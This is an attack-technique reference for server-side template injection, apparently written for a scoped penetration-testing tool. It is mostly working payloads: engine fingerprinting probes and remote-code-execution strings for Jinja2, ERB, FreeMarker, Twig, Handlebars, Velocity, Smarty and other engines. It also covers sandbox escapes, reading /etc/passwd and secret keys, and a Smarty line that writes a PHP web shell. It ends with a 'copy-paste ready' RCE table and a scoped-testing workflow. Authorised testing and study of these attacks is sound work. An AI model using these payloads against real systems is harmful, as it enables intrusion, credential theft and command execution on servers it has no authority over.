---
id: PS-SSTI
category: Server-side template injection
lab_count: 7
wstg_refs: [WSTG-INPV-18]
---

# Server-Side Template Injection (SSTI): Attack Technique Reference

SSTI occurs when user input is concatenated directly into a server-side template rather than passed as data. The attacker injects native template syntax that the engine evaluates server-side, potentially achieving information disclosure, file read, or remote code execution.

---

## 1. Detection

### 1A. Fuzzing with Polyglot Probe

Inject a universal probe string that triggers errors or evaluation across multiple template engines:

```
${{<%[%'"}}%\
```

If the application throws an error or renders part of the string differently than expected, a template engine is processing the input.

### 1B. Math Expression Probes

Inject simple math expressions in various template syntaxes. If the response shows the evaluated result instead of the literal string, SSTI is confirmed.

```
{{7*7}}           → 49 = Jinja2, Twig, Django, Nunjucks, Pebble
${7*7}            → 49 = FreeMarker, Velocity, Thymeleaf, Mako
#{7*7}            → 49 = Ruby ERB, Thymeleaf, Java EL
<%= 7*7 %>        → 49 = ERB (Ruby), EJS (Node.js)
{7*7}             → 49 = Velocity, Smarty
${T(java.lang.Math).random()}  → 0.xxxx = Spring EL
#{T(java.lang.Math).random()}  → 0.xxxx = Thymeleaf
```

### 1C. Engine Identification Decision Tree

Use differential responses to identify the specific template engine:

```
Step 1: Inject {{7*'7'}}
  → "7777777" (string repeated 7 times) → Jinja2
  → "49" (multiplication)               → Twig
  → Error                               → Neither — try next

Step 2: Inject ${7*7}
  → "49"    → FreeMarker, Velocity, or Mako
  → Error   → Try #{7*7}

Step 3: Inject #{7*7}
  → "49"    → Thymeleaf or Java EL
  → Error   → Try <%= 7*7 %>

Step 4: Inject <%= 7*7 %>
  → "49"    → ERB (Ruby) or EJS (Node.js)
```

**Error messages are valuable:** Template parsing errors often reveal the engine name and version. Trigger an error intentionally:

```
{{invalid syntax here!!!}}
${bad_expression}
<%= undefined_var %>
```

### 1D. Plaintext vs Code Context

**Plaintext context:** Input is rendered directly in the template output.
```
# Input: ${7*7}
# Output: Hello 49!   ← SSTI confirmed
```

**Code context:** Input is placed inside a template expression (e.g., inside a variable assignment). You must break out of the existing expression first:
```
# If input goes into: Hello {{user.name}}
# where user.name is your input, try:
}}{{7*7}}
# Output: Hello }}49{{   ← but may need to close properly

# For Tornado/Jinja2:
}}{% import os %}{{os.popen('id').read()}}
```

---

## 2. Engine-Specific Exploitation

### 2A. Jinja2 (Python — Flask, Django)

**Detection probes:**
```
{{7*7}}            → 49
{{7*'7'}}          → 7777777
{{config}}         → Flask config object (info disclosure)
{{config.items()}} → All config key-value pairs
```

**Information disclosure:**
```
{{config}}
{{config.SECRET_KEY}}
{{settings.SECRET_KEY}}
{{request.environ}}
{{self.__dict__}}
```

**Remote code execution via MRO traversal:**
```
# Find the os module via string class MRO
{{''.__class__.__mro__[1].__subclasses__()}}

# Locate subprocess.Popen (usually index ~400+, varies by Python version)
{{''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()}}

# Using lipsum (available in Jinja2 by default)
{{lipsum.__globals__['os'].popen('id').read()}}

# Using cycler
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Using joiner
{{joiner.__init__.__globals__.os.popen('id').read()}}

# Using namespace
{{namespace.__init__.__globals__.os.popen('id').read()}}

# Using request (Flask)
{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__init__.__globals__['os'].popen('id').read()}}

# Using config
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

> Lab refs: PS-SSTI-05

### 2B. ERB (Ruby — Rails)

**Detection probes:**
```
<%= 7*7 %>          → 49
<%= Dir.entries('/') %>   → directory listing
```

**File read:**
```
<%= File.open('/etc/passwd').read %>
<%= IO.read('/etc/passwd') %>
```

**Remote code execution:**
```
<%= system('whoami') %>
<%= `whoami` %>
<%= IO.popen('whoami').read %>
<%= exec('whoami') %>
<%= %x(whoami) %>
```

> Lab refs: PS-SSTI-01

### 2C. Tornado (Python)

**Detection probes:**
```
{{7*7}}           → 49
```

**Remote code execution:**
```
{% import os %}{{os.popen('whoami').read()}}
{% import os %}{{os.popen('id').read()}}
{% import subprocess %}{{subprocess.check_output('id',shell=True)}}
```

> Lab refs: PS-SSTI-02

### 2D. FreeMarker (Java)

**Detection probes:**
```
${7*7}            → 49
${.version}       → FreeMarker version number
```

**Remote code execution:**
```
# Using Execute utility
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /etc/passwd")}

# Using ObjectConstructor
<#assign classloader=object?class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.utility.ObjectConstructor")>
<#assign dwf=owc.newInstance()>
${dwf("java.lang.ProcessBuilder",["id"]).start()}

# Using JythonRuntime (if Jython on classpath)
<#assign jr="freemarker.template.utility.JythonRuntime"?new()><@jr>import os; os.popen("id").read()</@jr>
```

**File read:**
```
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
```

> Lab refs: PS-SSTI-03, PS-SSTI-06

### 2E. Handlebars (Node.js)

**Detection probes:**
```
{{this}}          → Dumps current context object
{{#each this}}{{@key}}={{this}},{{/each}}  → Enumerate all properties
```

**Remote code execution (prototype chain traversal):**
```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

> Lab refs: PS-SSTI-04

### 2F. Velocity (Java)

**Detection probes:**
```
#set($x=7*7)${x}   → 49
$class.type          → may dump ClassTool info
```

**Remote code execution:**
```
# Using ClassTool
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])$chr.toChars($out.read())#end

# Simplified version
#set($runtime=$class.inspect("java.lang.Runtime").type.getRuntime())
#set($process=$runtime.exec("whoami"))
#set($reader=$class.inspect("java.io.BufferedReader").type.getConstructor($class.inspect("java.io.Reader").type).newInstance($class.inspect("java.io.InputStreamReader").type.getConstructor($class.inspect("java.io.InputStream").type).newInstance($process.getInputStream())))
$reader.readLine()
```

### 2G. Twig (PHP)

**Detection probes:**
```
{{7*7}}            → 49
{{7*'7'}}          → 49 (unlike Jinja2 which returns 7777777)
{{dump(app)}}      → Dumps the app object (Symfony)
```

**Information disclosure:**
```
{{app.request.server.all|join(',')}}
{{app.request.cookies.all|join(',')}}
{{_self.env.getExtension('Twig\Extension\CoreExtension')}}
```

**Remote code execution (Twig < 1.20):**
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
```

**Remote code execution (Twig 1.x):**
```
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('exec')}}
```

**Remote code execution (Twig 2.x/3.x):**
```
{{['id']|map('system')}}
{{['id']|sort('system')}}
{{['id']|reduce('system')}}
```

### 2H. Smarty (PHP)

**Detection probes:**
```
{7*7}              → 49
{$smarty.version}  → version number
```

**Remote code execution:**
```
{system('id')}
{exec('whoami')}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET['cmd']); ?>",self::clearConfig())}
{if system('id')}{/if}
```

### 2I. Mako (Python)

**Detection probes:**
```
${7*7}            → 49
```

**Remote code execution:**
```
<%
  import os
  x = os.popen('id').read()
%>
${x}

# One-liner
${__import__('os').popen('id').read()}
```

### 2J. Pebble (Java)

**Detection probes:**
```
{{7*7}}           → 49
```

**Remote code execution:**
```
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]).toArray()) }}
```

### 2K. Django (Python)

Django templates are designed to be logic-less and do not support arbitrary Python execution. However, information disclosure is possible.

**Detection probes:**
```
{% debug %}        → Dumps debug information
{{settings}}       → May expose Django settings
```

**Information disclosure:**
```
{% debug %}
{{settings.SECRET_KEY}}
{{settings.DATABASES}}
{{request.META}}
```

> Lab refs: PS-SSTI-05 (Django info disclosure)

---

## 3. Detection Probe Table

| Probe | Engine (if evaluates) | Expected Output |
|-------|----------------------|-----------------|
| `{{7*7}}` | Jinja2, Twig, Nunjucks, Pebble, Django | `49` |
| `{{7*'7'}}` | Jinja2 | `7777777` |
| `{{7*'7'}}` | Twig | `49` |
| `${7*7}` | FreeMarker, Velocity, Thymeleaf, Mako | `49` |
| `#{7*7}` | Ruby ERB, Thymeleaf, Java EL | `49` |
| `<%= 7*7 %>` | ERB, EJS | `49` |
| `{7*7}` | Smarty, Velocity | `49` |
| `#set($x=7*7)${x}` | Velocity | `49` |
| `${{7*7}}` | Thymeleaf (Spring) | `49` |
| `${T(java.lang.Runtime)}` | Spring EL | class descriptor |
| `{% debug %}` | Django | debug info dump |
| `{{config}}` | Flask/Jinja2 | config object |

---

## 4. Sandbox Escape Techniques

### 4A. Python Sandbox Escape (Jinja2)

When direct `os` import is blocked, traverse Python's object hierarchy:

```
# Step 1: Find all subclasses of object
{{''.__class__.__mro__[1].__subclasses__()}}

# Step 2: Locate a class with access to os (e.g., _io._IOBase, warnings.catch_warnings)
# Iterate subclasses looking for one with __globals__ containing 'os' or 'subprocess'
{{''.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__}}

# Step 3: Execute via the located path
{{''.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__['os'].popen('id').read()}}

# Alternative: Use __builtins__
{{''.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
```

### 4B. Java Sandbox Escape (FreeMarker)

FreeMarker sandboxes restrict which classes and methods can be called. Bypass via reflection:

```
# Access the class loader
<#assign classloader = object?class.protectionDomain.classLoader>

# Load restricted classes via reflection
<#assign cl = classloader.loadClass("freemarker.template.utility.Execute")>
<#assign ex = cl.newInstance()>
${ex("id")}
```

> Lab refs: PS-SSTI-06, PS-SSTI-07

### 4C. Node.js Sandbox Escape (Handlebars)

Escape restricted evaluation context by traversing prototype chains to reach `require()`:

```
# Access Function constructor through prototype chain
{{constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}}
```

---

## 5. Quick Reference: SSTI Payloads by Engine

### Detection (all engines)

```
${{<%[%'"}}%\
{{7*7}}
${7*7}
#{7*7}
<%= 7*7 %>
{7*7}
{{7*'7'}}
```

### RCE Payloads (copy-paste ready)

| Engine | Payload |
|--------|---------|
| Jinja2 | `{{lipsum.__globals__['os'].popen('id').read()}}` |
| ERB | `<%= system('id') %>` |
| Tornado | `{% import os %}{{os.popen('id').read()}}` |
| FreeMarker | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| Twig (3.x) | `{{['id']|map('system')}}` |
| Smarty | `{system('id')}` |
| Mako | `${__import__('os').popen('id').read()}` |
| Velocity | `#set($x=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))` |
| Pebble | see Section 2J above |
| Handlebars | see Section 2E above (multi-line) |
## Rynix workflow

1. `get_technique_guide` for `ssti` — confirm test objectives.
2. `scope_check` + `register_scope` for the target host.
3. Static pass: `analyze_repo`, `rbac_matrix`, `high_risk_surfaces`.
4. Dynamic pass: `http_probe`, `record_finding`.
5. `record_finding` with probe evidence; `track_wstg_test` when mapped.

## Rynix tooling

- `http_probe`
- `record_finding`

## Evidence requirements

- Reproducible request/response or role-comparison diff.
- Session ID on all live tool calls.
- Link findings to endpoint + parameter, not generic claims.

## ASVS mapping

- V4 Access Control — role-appropriate responses for protected resources.
- V5 Validation — input handling for injection and parser differentials.

## CWE references

- CWE-284: Improper Access Control
- CWE-20: Improper Input Validation
## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

